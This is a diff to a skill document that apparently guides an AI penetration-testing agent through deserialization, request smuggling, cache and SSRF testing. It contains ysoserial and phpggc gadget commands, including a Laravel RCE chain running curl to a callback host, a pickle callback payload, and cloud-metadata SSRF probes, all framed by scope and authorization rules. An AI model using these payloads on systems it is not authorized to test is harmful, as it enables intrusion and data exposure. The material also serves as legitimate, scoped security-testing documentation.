@@ -9,19 +9,36 @@ These are the classes open agents miss most (Strix's unsolved XBEN set
 includes smuggling and PHP deserialization). Every tool below is a
 **candidate generator**; nothing it prints is a finding on its own.
 
+Triage selects this skill (`skills/registry.yaml`) when the surface shows a
+`Via` header or a CDN, load balancer or caching proxy in `Server`, an
+`X-AspNet-Version` header, an XML, XSD, WSDL, SVG or Office document path, a
+`viewstate`, `xml`, `soap`, `serialized`, `template` or redirect-target
+parameter, or a Java, .NET or ColdFusion application server in the fingerprint.
+It drives `ssrfprobe` (`probe`, `metadata`, `blind`, `rebind`) and `verify`.
+
+**Modern HTTP desync has its own skill.** 0.CL, CL.0, the Expect-based
+variants, H2.TE, CRLF-powered desync, the baseline-versus-trigger detection
+standard and the `raw` tool are in **desync**. The CL.TE/TE.CL recipe below is
+the 2019 subset: run it as one pass inside that skill, not as the whole
+class.
+
 | tool | role | in the toolbox image? |
 |---|---|---|
-| Web-Cache-Vulnerability-Scanner (`wcvs`) | candidates only | no. Kali package `web-cache-vulnerability-scanner` or `go install github.com/Hackmanit/Web-Cache-Vulnerability-Scanner@latest` |
-| smuggler.py (defparam) | candidates only, documented FPs on large CDNs | no. `git clone https://github.com/defparam/smuggler /tmp/smuggler` in the toolbox (lab) |
-| ysoserial / ysoserial.net | payload builder | no (needs Java / Windows .NET) |
-| phpggc | payload builder | no (needs PHP) |
+| Web-Cache-Vulnerability-Scanner (`wcvs`) | candidates only | **yes**, pinned (toolbox/tools.txt) |
+| smuggler.py (defparam) | candidates only, documented FPs on large CDNs | **yes**, pinned at a commit, on PATH as `smuggler.py` |
+| ysoserial | payload builder (Java) | **yes**, `ysoserial-all.jar` v0.0.6 + a JRE, wrapper `ysoserial` |
+| phpggc | payload builder (PHP) | **yes**, pinned at a commit + `php-cli`, wrapper `phpggc` |
+| crlfuzz | candidates only, CRLF / response-header injection | **yes**, v1.4.1, via `scripts/tools crlf` |
 | nuclei (`-tags xxe,deserialization,cache,smuggling`) | candidates only | yes |
 | interactsh-client, lab `oast` catcher | **proof** (OOB) | yes / lab |
 | curl, python3 raw sockets | **proof** (differential pair) | yes |
 
-Tool facts for ysoserial, phpggc and the gadget names below are general
-knowledge, not verified against sources in the research; check `--help` /
-`-l` output before relying on a flag.
+This column used to say "no" for the first four and told you to `go install`
+and `git clone` them at run time. All four have been in the image for several
+releases; verify with `scripts/mythos tools` rather than either claim.
+
+Flags still get checked against `--help` before use — but prefer the wrapper
+where one exists, because it caps and paces what the bare tool does not.
 
 ## Common rules
 
@@ -37,7 +54,8 @@ knowledge, not verified against sources in the research; check `--help` /
   lab, no file reads beyond `/etc/hostname`, never poison a cache key or a
   backend connection another user can hit.
 - Requires `scope.rules.allow_active`; proofs with side effects need
-  `allow_exploit` and the user's go (see **exploit**).
+  `allow_exploit`, and anything you cannot prove on an object of your own is
+  skipped with that reason (see **exploit**).
 
 ## Insecure deserialization
 
@@ -45,11 +63,26 @@ Signals: `rO0AB` / `aced0005` (Java), `O:<n>:"` / `a:<n>:{` (PHP),
 `gASV` / `\x80\x04` (pickle), `$type` in JSON (.NET), `__VIEWSTATE` without
 MAC, `--- !ruby/object`. See `knowledge/web/deserialization.md`.
 
-Confirm with a gadget whose only effect is a callback:
-- Java: `java -jar ysoserial.jar URLDNS 'http://<token>.<oast-domain>'`
-  (DNS lookup only, no code execution; needs interactsh DNS).
-- PHP: `phpggc -l <framework>` and pick a chain whose type is file read/SSRF-like
-  pointing at `http://oast:8080/<token>`; otherwise a time-based chain.
+Confirm with a gadget whose only effect is a callback. Generating one sends
+nothing, so this step is offline and `scripts/tools gadget` does not touch the
+target at all:
+
+```
+scripts/tools gadget list --lang java --json      # what this image can build
+scripts/tools gadget list --lang php  --json      # with each chain's type and vector
+scripts/tools gadget java URLDNS --cmd 'http://<token>.<oast-domain>' --out p.b64
+scripts/tools gadget php  Laravel/RCE1 'curl http://oast:8080/<token>'
+```
+
+- Java: `URLDNS` is a DNS lookup only, no code execution, and the right first
+  try; `ysoserial` needs the named library version on the target's classpath,
+  which is what `scripts/sbom` tells you.
+- PHP: pick a chain whose type is file read or SSRF-like and point it at the
+  OAST catcher; otherwise a time-based chain.
+- A **File delete** chain and a destructive `--cmd` are refused with exit 3.
+  `hooks/scope-guard.py` refuses data destruction in every mode and no scope
+  rule overrides it, so prove deserialization with the callback instead — which
+  is the oracle a report needs anyway.
 - Python pickle (lab only): an object whose `__reduce__` calls
   `urllib.request.urlopen('http://oast:8080/<token>')`.
 
@@ -128,6 +161,54 @@ EOF
 ```
 
 See `knowledge/web/request-smuggling.md`.
+
+## SSRF: classify the primitive before claiming impact
+
+"SSRF confirmed" is half an answer. What the finding is worth depends entirely
+on what the primitive controls, so `ssrfprobe` reports method control and
+header control as separate, explicit facts rather than printing "cloud
+credentials reachable" off one callback.
+
+```
+script: name "ssrfprobe",
+        args ["probe", "<URL>", "<parameter>",
+              "--oast", "<a host you control and scope.yaml authorizes>",
+              "--control", "<a destination the application is meant to allow>",
+              "--marker", "<a string your OAST host serves in its body>",
+              "--oast-log", "http://oast:8080/__log"]
+```
+
+One request per URL form, then it reads the OAST log. `--marker` is what makes
+"response visible" answerable at all: without it that stays `unknown` rather
+than being reported as no. `--control` is the negative control.
+
+```
+script: name "ssrfprobe",
+        args ["blind", "<URL>", "<parameter>", "<another parameter>",
+              "--oast", "<your OAST host>", "--wait", "60",
+              "--oast-log-file", "engagements/<dir>/scan/interactsh.jsonl"]
+script: name "ssrfprobe",
+        args ["metadata", "<URL>", "<parameter>"]
+script: name "ssrfprobe", args ["rebind", "<host>", "--samples", "3"]
+```
+
+`blind` mints one token per injection point and runs a control arm, so a late
+callback is attributable. `metadata` points at the **lab emulator** by default
+(`http://cloud-metadata`, and `http://cloud-metadata-v2` for the IMDSv2 shape)
+on the lab's internal network with no published port, which is the point: it is
+only reachable through the SSRF sink itself. A real link-local target needs
+`--real` and `--i-have-authorization` and is still subject to the scope check
+and the programme's rules. `rebind` is **detection only**: does the target
+resolve the name more than once, and does it honour a short TTL.
+
+Two rules that are not this skill's to relax. **The destination is in scope or
+it is refused**, not warned about: a request the target makes on your behalf
+counts as yours, so the OAST host belongs in `scope.yaml`, added in an editor
+before the run. And **nothing here reads or stores a credential** — the
+metadata paths are the instance listings, a path naming a credential surface is
+refused, and the proof stops at "the metadata endpoint answered, with this much
+method and header control". `knowledge/web/ssrf.md` has the sink list and the
+bypass forms.
 
 ## Output
 
